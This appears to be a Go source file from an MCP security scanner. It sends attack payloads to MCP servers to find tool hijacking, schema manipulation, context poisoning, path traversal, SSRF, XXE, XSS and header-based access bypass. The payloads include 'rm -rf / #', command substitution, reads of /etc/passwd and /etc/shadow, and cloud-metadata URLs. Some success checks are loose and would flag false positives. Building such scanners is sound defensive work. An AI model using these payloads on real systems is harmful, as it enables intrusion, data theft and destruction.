package scanner

import (
	"fmt"
	"strings"
	"time"

	"github.com/syphon1c/mcp-security-scanner/pkg/types"
)

// MCPVulnerabilityTester implements advanced MCP-specific attack detection
type MCPVulnerabilityTester struct {
	scanner *Scanner
}

// NewMCPVulnerabilityTester creates a new MCP vulnerability tester
func NewMCPVulnerabilityTester(scanner *Scanner) *MCPVulnerabilityTester {
	return &MCPVulnerabilityTester{
		scanner: scanner,
	}
}

// TestToolPoisoning tests for tool poisoning vulnerabilities
func (mvt *MCPVulnerabilityTester) TestToolPoisoning(serverURL string, tools []types.MCPTool) []types.Finding {
	findings := []types.Finding{}

	for _, tool := range tools {
		// Test for tool hijacking through parameter manipulation
		poisoningFindings := mvt.testToolHijacking(serverURL, tool)
		findings = append(findings, poisoningFindings...)

		// Test for tool schema manipulation
		schemaFindings := mvt.testSchemaManipulation(serverURL, tool)
		findings = append(findings, schemaFindings...)

		// Test for tool execution context poisoning
		contextFindings := mvt.testExecutionContextPoisoning(serverURL, tool)
		findings = append(findings, contextFindings...)
	}

	return findings
}

// testToolHijacking tests for tool hijacking vulnerabilities
func (mvt *MCPVulnerabilityTester) testToolHijacking(serverURL string, tool types.MCPTool) []types.Finding {
	findings := []types.Finding{}

	// Tool hijacking payloads
	hijackingPayloads := []struct {
		name        string
		payload     interface{}
		description string
	}{
		{
			name: "tool_override",
			payload: map[string]interface{}{
				"name":       tool.Name,
				"_override":  true,
				"_newTarget": "malicious://evil.server.com",
			},
			description: "Attempt to override tool execution target",
		},
		{
			name: "tool_redirect",
			payload: map[string]interface{}{
				"name":      tool.Name,
				"_redirect": "file:///etc/passwd",
				"_execute":  "cat /etc/passwd",
			},
			description: "Attempt to redirect tool execution to system files",
		},
		{
			name: "tool_injection",
			payload: map[string]interface{}{
				"name":    tool.Name,
				"_inject": "; rm -rf / #",
				"_exec":   "$(whoami)",
			},
			description: "Command injection through tool parameters",
		},
		{
			name: "tool_prototype_pollution",
			payload: map[string]interface{}{
				"name":              tool.Name,
				"__proto__":         map[string]interface{}{"isAdmin": true},
				"constructor.name":  "malicious",
				"prototype.valueOf": "function(){return 'pwned'}",
			},
			description: "JavaScript prototype pollution through tool parameters",
		},
	}

	for _, hijack := range hijackingPayloads {
		if payloadMap, ok := hijack.payload.(map[string]interface{}); ok {
			result, err := mvt.scanner.mcpClient.CallTool(serverURL, tool.Name, payloadMap)
			if err == nil && mvt.detectToolHijackingSuccess(result, hijack.name) {
				finding := types.Finding{
					ID:          fmt.Sprintf("TOOL_HIJACKING_%s_%d", strings.ToUpper(hijack.name), time.Now().UnixNano()),
					RuleID:      "TOOL_HIJACKING_001",
					Severity:    "Critical",
					Category:    "MCP Protocol Abuse",
					Title:       "Tool Hijacking Vulnerability",
					Description: hijack.description,
					Evidence:    fmt.Sprintf("Tool %s vulnerable to hijacking with payload: %v", tool.Name, hijack.payload),
					Location:    fmt.Sprintf("Tool: %s", tool.Name),
					Remediation: "Implement strict tool parameter validation and sanitization. Use allowlists for tool parameters.",
					Timestamp:   time.Now(),
				}
				findings = append(findings, finding)
			}
		}
	}

	return findings
}

// testSchemaManipulation tests for schema manipulation attacks
func (mvt *MCPVulnerabilityTester) testSchemaManipulation(serverURL string, tool types.MCPTool) []types.Finding {
	findings := []types.Finding{}

	// Schema manipulation payloads
	schemaPayloads := []struct {
		name        string
		payload     interface{}
		description string
	}{
		{
			name: "schema_override",
			payload: map[string]interface{}{
				"inputSchema": map[string]interface{}{
					"type": "object",
					"properties": map[string]interface{}{
						"command": map[string]interface{}{
							"type":        "string",
							"description": "System command to execute",
						},
					},
				},
			},
			description: "Attempt to override tool input schema",
		},
		{
			name: "schema_injection",
			payload: map[string]interface{}{
				"inputSchema": map[string]interface{}{
					"$ref":           "javascript:alert('XSS')",
					"additionalCode": "require('child_process').exec('whoami')",
				},
			},
			description: "Schema injection with malicious references",
		},
		{
			name: "schema_dos",
			payload: map[string]interface{}{
				"inputSchema": map[string]interface{}{
					"type": "object",
					"properties": func() map[string]interface{} {
						// Create deeply nested schema to cause DoS
						nested := map[string]interface{}{"type": "string"}
						for i := 0; i < 1000; i++ {
							nested = map[string]interface{}{
								"type": "object",
								"properties": map[string]interface{}{
									fmt.Sprintf("level_%d", i): nested,
								},
							}
						}
						return map[string]interface{}{"nested": nested}
					}(),
				},
			},
			description: "Deeply nested schema causing resource exhaustion",
		},
	}

	for _, schema := range schemaPayloads {
		// Test schema validation bypass
		result, err := mvt.testSchemaValidationBypass(serverURL, tool, schema.payload)
		if err == nil && mvt.detectSchemaManipulationSuccess(result) {
			finding := types.Finding{
				ID:          fmt.Sprintf("SCHEMA_MANIPULATION_%s_%d", strings.ToUpper(schema.name), time.Now().UnixNano()),
				RuleID:      "SCHEMA_MANIPULATION_001",
				Severity:    "High",
				Category:    "MCP Protocol Abuse",
				Title:       "Schema Manipulation Vulnerability",
				Description: schema.description,
				Evidence:    fmt.Sprintf("Tool %s schema manipulation successful: %v", tool.Name, schema.payload),
				Location:    fmt.Sprintf("Tool: %s", tool.Name),
				Remediation: "Implement strict schema validation. Validate all schema references and prevent arbitrary schema modifications.",
				Timestamp:   time.Now(),
			}
			findings = append(findings, finding)
		}
	}

	return findings
}

// testExecutionContextPoisoning tests for execution context poisoning
func (mvt *MCPVulnerabilityTester) testExecutionContextPoisoning(serverURL string, tool types.MCPTool) []types.Finding {
	findings := []types.Finding{}

	// Context poisoning payloads
	contextPayloads := []struct {
		name        string
		payload     interface{}
		description string
	}{
		{
			name: "context_env_pollution",
			payload: map[string]interface{}{
				"_context": map[string]interface{}{
					"env": map[string]interface{}{
						"PATH":           "/malicious/bin:/usr/bin",
						"LD_PRELOAD":     "/malicious/lib.so",
						"PYTHONPATH":     "/malicious/python",
						"NODE_PATH":      "/malicious/node",
						"MALICIOUS_FLAG": "injected",
					},
				},
			},
			description: "Environment variable pollution in execution context",
		},
		{
			name: "context_privilege_escalation",
			payload: map[string]interface{}{
				"_context": map[string]interface{}{
					"user":         "root",
					"group":        "wheel",
					"privileges":   []string{"admin", "sudo"},
					"capabilities": []string{"CAP_SYS_ADMIN", "CAP_NET_ADMIN"},
				},
			},
			description: "Privilege escalation through context manipulation",
		},
		{
			name: "context_resource_exhaustion",
			payload: map[string]interface{}{
				"_context": map[string]interface{}{
					"limits": map[string]interface{}{
						"memory":    "999GB",
						"cpu":       "100%",
						"processes": 99999,
						"files":     99999,
					},
				},
			},
			description: "Resource exhaustion through context limit manipulation",
		},
		{
			name: "context_sandbox_escape",
			payload: map[string]interface{}{
				"_context": map[string]interface{}{
					"sandbox":       false,
					"chroot":        "/",
					"network":       "unrestricted",
					"filesystem":    "full_access",
					"escape_vector": "../../../",
				},
			},
			description: "Sandbox escape through context manipulation",
		},
	}

	for _, context := range contextPayloads {
		if payloadMap, ok := context.payload.(map[string]interface{}); ok {
			result, err := mvt.scanner.mcpClient.CallTool(serverURL, tool.Name, payloadMap)
			if err == nil && mvt.detectContextPoisoningSuccess(result, context.name) {
				finding := types.Finding{
					ID:          fmt.Sprintf("CONTEXT_POISONING_%s_%d", strings.ToUpper(context.name), time.Now().UnixNano()),
					RuleID:      "CONTEXT_POISONING_001",
					Severity:    "Critical",
					Category:    "MCP Protocol Abuse",
					Title:       "Execution Context Poisoning",
					Description: context.description,
					Evidence:    fmt.Sprintf("Tool %s context poisoning successful: %v", tool.Name, context.payload),
					Location:    fmt.Sprintf("Tool: %s", tool.Name),
					Remediation: "Implement strict execution context isolation. Validate and sanitize all context parameters.",
					Timestamp:   time.Now(),
				}
				findings = append(findings, finding)
			}
		}
	}

	return findings
}

// TestResourceManipulation tests for resource manipulation vulnerabilities
func (mvt *MCPVulnerabilityTester) TestResourceManipulation(serverURL string, resources []types.MCPResource) []types.Finding {
	findings := []types.Finding{}

	for _, resource := range resources {
		// Test for resource URI manipulation
		uriFindings := mvt.testResourceURIManipulation(serverURL, resource)
		findings = append(findings, uriFindings...)

		// Test for resource content injection
		injectionFindings := mvt.testResourceContentInjection(serverURL, resource)
		findings = append(findings, injectionFindings...)

		// Test for resource metadata poisoning
		metadataFindings := mvt.testResourceMetadataPoisoning(serverURL, resource)
		findings = append(findings, metadataFindings...)

		// Test for resource access control bypass
		aclFindings := mvt.testResourceAccessControlBypass(serverURL, resource)
		findings = append(findings, aclFindings...)
	}

	return findings
}

// testResourceURIManipulation tests for URI manipulation attacks
func (mvt *MCPVulnerabilityTester) testResourceURIManipulation(serverURL string, resource types.MCPResource) []types.Finding {
	findings := []types.Finding{}

	// URI manipulation payloads
	uriPayloads := []string{
		// Path traversal variants
		resource.URI + "/../../../etc/passwd",
		resource.URI + "/..%2f..%2f..%2fetc%2fpasswd",
		resource.URI + "/....//....//....//etc/passwd",

		// Protocol manipulation
		"file://" + resource.URI,
		"ftp://malicious.server.com/" + resource.URI,
		"data:text/html,<script>alert('XSS')</script>",

		// URI scheme confusion
		"javascript:alert('XSS')",
		"vbscript:msgbox('XSS')",
		"jar:http://malicious.com!/evil.class",

		// SSRF attempts
		"http://169.254.169.254/latest/meta-data/",
		"http://localhost:22/",
		"gopher://127.0.0.1:25/",

		// Local file access
		"file:///etc/passwd",
		"file:///proc/self/environ",
		"file:///var/log/auth.log",
	}

	for _, maliciousURI := range uriPayloads {
		result, err := mvt.scanner.mcpClient.ReadResource(serverURL, maliciousURI)
		if err == nil && mvt.detectURIManipulationSuccess(string(result), maliciousURI) {
			finding := types.Finding{
				ID:          fmt.Sprintf("URI_MANIPULATION_%d", time.Now().UnixNano()),
				RuleID:      "URI_MANIPULATION_001",
				Severity:    "High",
				Category:    "MCP Protocol Abuse",
				Title:       "Resource URI Manipulation",
				Description: "Server accepts manipulated resource URIs",
				Evidence:    fmt.Sprintf("Successfully accessed resource with manipulated URI: %s", maliciousURI),
				Location:    fmt.Sprintf("Resource: %s", resource.URI),
				Remediation: "Implement strict URI validation and sanitization. Use allowlists for resource schemes and paths.",
				Timestamp:   time.Now(),
			}
			findings = append(findings, finding)
		}
	}

	return findings
}

// testResourceContentInjection tests for content injection in resources
func (mvt *MCPVulnerabilityTester) testResourceContentInjection(serverURL string, resource types.MCPResource) []types.Finding {
	findings := []types.Finding{}

	// Content injection payloads based on MIME type
	var injectionPayloads []string

	switch {
	case strings.Contains(resource.MimeType, "json"):
		injectionPayloads = []string{
			`{"__proto__": {"isAdmin": true}}`,
			`{"constructor": {"prototype": {"evil": "payload"}}}`,
			`{"$ref": "javascript:alert('XSS')"}`,
		}
	case strings.Contains(resource.MimeType, "xml"):
		injectionPayloads = []string{
			`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
			`<script>alert('XSS')</script>`,
			`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow">]><userInfo><firstName>John</firstName><lastName>&ent;</lastName></userInfo>`,
		}
	case strings.Contains(resource.MimeType, "html"):
		injectionPayloads = []string{
			`<script>alert('XSS')</script>`,
			`<iframe src="javascript:alert('XSS')"></iframe>`,
			`<img src="x" onerror="alert('XSS')">`,
		}
	default:
		injectionPayloads = []string{
			"$(whoami)",
			"; cat /etc/passwd",
			"`id`",
			"${env:PATH}",
		}
	}

	for _, payload := range injectionPayloads {
		// Attempt to inject content into resource
		result, err := mvt.injectResourceContent(serverURL, resource, payload)
		if err == nil && mvt.detectContentInjectionSuccess(result, payload) {
			finding := types.Finding{
				ID:          fmt.Sprintf("CONTENT_INJECTION_%d", time.Now().UnixNano()),
				RuleID:      "CONTENT_INJECTION_001",
				Severity:    "High",
				Category:    "MCP Protocol Abuse",
				Title:       "Resource Content Injection",
				Description: "Server vulnerable to content injection in resources",
				Evidence:    fmt.Sprintf("Successfully injected content: %s", payload),
				Location:    fmt.Sprintf("Resource: %s", resource.URI),
				Remediation: "Implement strict content validation and output encoding. Sanitize all resource content.",
				Timestamp:   time.Now(),
			}
			findings = append(findings, finding)
		}
	}

	return findings
}

// testResourceMetadataPoisoning tests for metadata poisoning attacks
func (mvt *MCPVulnerabilityTester) testResourceMetadataPoisoning(serverURL string, resource types.MCPResource) []types.Finding {
	findings := []types.Finding{}

	// Metadata poisoning payloads
	metadataPayloads := map[string]interface{}{
		"content-type":                "text/html; charset=utf-8",
		"x-frame-options":             "ALLOWALL",
		"content-security-policy":     "default-src *",
		"access-control-allow-origin": "*",
		"x-xss-protection":            "0",
		"strict-transport-security":   "max-age=0",
		"cache-control":               "no-cache, no-store",
		"pragma":                      "no-cache",
		"expires":                     "Thu, 01 Jan 1970 00:00:00 GMT",
		"server":                      "evil-server/1.0",
		"x-powered-by":                "malicious-framework",
		"location":                    "javascript:alert('XSS')",
		"refresh":                     "0;url=javascript:alert('XSS')",
	}

	for header, value := range metadataPayloads {
		result, err := mvt.manipulateResourceMetadata(serverURL, resource, header, value)
		if err == nil && mvt.detectMetadataPoisoningSuccess(result, header) {
			finding := types.Finding{
				ID:          fmt.Sprintf("METADATA_POISONING_%d", time.Now().UnixNano()),
				RuleID:      "METADATA_POISONING_001",
				Severity:    "Medium",
				Category:    "MCP Protocol Abuse",
				Title:       "Resource Metadata Poisoning",
				Description: "Server accepts manipulated resource metadata",
				Evidence:    fmt.Sprintf("Successfully manipulated header %s: %v", header, value),
				Location:    fmt.Sprintf("Resource: %s", resource.URI),
				Remediation: "Implement strict metadata validation. Use allowlists for headers and values.",
				Timestamp:   time.Now(),
			}
			findings = append(findings, finding)
		}
	}

	return findings
}

// testResourceAccessControlBypass tests for access control bypass
func (mvt *MCPVulnerabilityTester) testResourceAccessControlBypass(serverURL string, resource types.MCPResource) []types.Finding {
	findings := []types.Finding{}

	// Access control bypass techniques
	bypassTechniques := []struct {
		name        string
		headers     map[string]string
		description string
	}{
		{
			name: "header_injection",
			headers: map[string]string{
				"X-Forwarded-For":  "127.0.0.1",
				"X-Real-IP":        "localhost",
				"X-Originating-IP": "127.0.0.1",
				"X-Remote-IP":      "127.0.0.1",
				"X-Client-IP":      "127.0.0.1",
				"CF-Connecting-IP": "127.0.0.1",
				"True-Client-IP":   "127.0.0.1",
			},
			description: "IP address spoofing through header injection",
		},
		{
			name: "method_override",
			headers: map[string]string{
				"X-HTTP-Method-Override": "GET",
				"X-HTTP-Method":          "GET",
				"X-Method-Override":      "GET",
			},
			description: "HTTP method override to bypass restrictions",
		},
		{
			name: "auth_bypass",
			headers: map[string]string{
				"Authorization":  "Bearer admin-token",
				"X-Admin":        "true",
				"X-User-Role":    "administrator",
				"X-Privilege":    "admin",
				"X-Access-Level": "full",
			},
			description: "Authentication bypass through header manipulation",
		},
	}

	for _, technique := range bypassTechniques {
		result, err := mvt.testAccessControlBypass(serverURL, resource, technique.headers)
		if err == nil && mvt.detectAccessControlBypassSuccess(result) {
			finding := types.Finding{
				ID:          fmt.Sprintf("ACCESS_BYPASS_%s_%d", strings.ToUpper(technique.name), time.Now().UnixNano()),
				RuleID:      "ACCESS_BYPASS_001",
				Severity:    "Critical",
				Category:    "Authentication/Authorization",
				Title:       "Resource Access Control Bypass",
				Description: technique.description,
				Evidence:    fmt.Sprintf("Successfully bypassed access control using headers: %v", technique.headers),
				Location:    fmt.Sprintf("Resource: %s", resource.URI),
				Remediation: "Implement proper access control validation. Don't rely solely on client-side headers for security decisions.",
				Timestamp:   time.Now(),
			}
			findings = append(findings, finding)
		}
	}

	return findings
}

// Helper methods for detection

func (mvt *MCPVulnerabilityTester) detectToolHijackingSuccess(result interface{}, attackType string) bool {
	if result == nil {
		return false
	}

	resultStr := fmt.Sprintf("%v", result)

	// Look for indicators of successful hijacking
	indicators := []string{
		"malicious", "evil", "pwned", "hijacked",
		"uid=", "gid=", "/etc/passwd", "root:",
		"isAdmin\":true", "prototype", "__proto__",
		"file:///", "redirect", "override",
	}

	for _, indicator := range indicators {
		if strings.Contains(strings.ToLower(resultStr), strings.ToLower(indicator)) {
			return true
		}
	}

	return false
}

func (mvt *MCPVulnerabilityTester) detectSchemaManipulationSuccess(result interface{}) bool {
	// Check if schema manipulation was successful
	if result == nil {
		return false
	}

	resultStr := fmt.Sprintf("%v", result)
	return strings.Contains(resultStr, "schema") ||
		strings.Contains(resultStr, "validation") ||
		strings.Contains(resultStr, "properties")
}

func (mvt *MCPVulnerabilityTester) detectContextPoisoningSuccess(result interface{}, attackType string) bool {
	if result == nil {
		return false
	}

	resultStr := fmt.Sprintf("%v", result)

	switch attackType {
	case "context_env_pollution":
		return strings.Contains(resultStr, "MALICIOUS_FLAG") ||
			strings.Contains(resultStr, "/malicious/")
	case "context_privilege_escalation":
		return strings.Contains(resultStr, "root") ||
			strings.Contains(resultStr, "admin") ||
			strings.Contains(resultStr, "CAP_SYS_ADMIN")
	case "context_sandbox_escape":
		return strings.Contains(resultStr, "escape") ||
			strings.Contains(resultStr, "full_access")
	}

	return false
}

func (mvt *MCPVulnerabilityTester) detectURIManipulationSuccess(result interface{}, uri string) bool {
	if result == nil {
		return false
	}

	resultStr := fmt.Sprintf("%v", result)

	// Look for successful file access or SSRF
	successIndicators := []string{
		"root:", "bin/bash", "/etc/passwd",
		"meta-data", "localhost", "127.0.0.1",
		"<script", "alert(", "javascript:",
	}

	for _, indicator := range successIndicators {
		if strings.Contains(strings.ToLower(resultStr), strings.ToLower(indicator)) {
			return true
		}
	}

	return false
}

func (mvt *MCPVulnerabilityTester) detectContentInjectionSuccess(result interface{}, payload string) bool {
	if result == nil {
		return false
	}

	resultStr := fmt.Sprintf("%v", result)

	// Check if payload was reflected or executed
	return strings.Contains(resultStr, payload) ||
		strings.Contains(resultStr, "XSS") ||
		strings.Contains(resultStr, "uid=") ||
		strings.Contains(resultStr, "gid=")
}

func (mvt *MCPVulnerabilityTester) detectMetadataPoisoningSuccess(result interface{}, header string) bool {
	if result == nil {
		return false
	}

	// Check if metadata manipulation was accepted
	resultStr := fmt.Sprintf("%v", result)
	return strings.Contains(strings.ToLower(resultStr), strings.ToLower(header))
}

func (mvt *MCPVulnerabilityTester) detectAccessControlBypassSuccess(result interface{}) bool {
	if result == nil {
		return false
	}

	resultStr := fmt.Sprintf("%v", result)

	// Look for signs of successful access
	return strings.Contains(resultStr, "200") ||
		strings.Contains(resultStr, "success") ||
		strings.Contains(resultStr, "allowed") ||
		!strings.Contains(resultStr, "403") &&
			!strings.Contains(resultStr, "401") &&
			!strings.Contains(resultStr, "unauthorized")
}

// Helper methods for test execution

func (mvt *MCPVulnerabilityTester) testSchemaValidationBypass(serverURL string, tool types.MCPTool, schema interface{}) (interface{}, error) {
	// Create a payload that attempts to override the schema
	payload := map[string]interface{}{
		"schema_override": schema,
		"name":            tool.Name,
	}

	result, err := mvt.scanner.mcpClient.CallTool(serverURL, tool.Name, payload)
	return string(result), err
}

func (mvt *MCPVulnerabilityTester) injectResourceContent(serverURL string, resource types.MCPResource, payload string) (interface{}, error) {
	// Attempt to inject content by manipulating the resource URI
	maliciousURI := resource.URI + "?inject=" + payload
	result, err := mvt.scanner.mcpClient.ReadResource(serverURL, maliciousURI)
	return string(result), err
}

func (mvt *MCPVulnerabilityTester) manipulateResourceMetadata(serverURL string, resource types.MCPResource, header string, value interface{}) (interface{}, error) {
	// Attempt to manipulate metadata through custom headers
	headers := map[string]string{
		header: fmt.Sprintf("%v", value),
	}
	result, err := mvt.scanner.mcpClient.ReadResourceWithHeaders(serverURL, resource.URI, headers)
	return string(result), err
}

func (mvt *MCPVulnerabilityTester) testAccessControlBypass(serverURL string, resource types.MCPResource, headers map[string]string) (interface{}, error) {
	// Test access control bypass using manipulated headers
	result, err := mvt.scanner.mcpClient.ReadResourceWithHeaders(serverURL, resource.URI, headers)
	return string(result), err
}
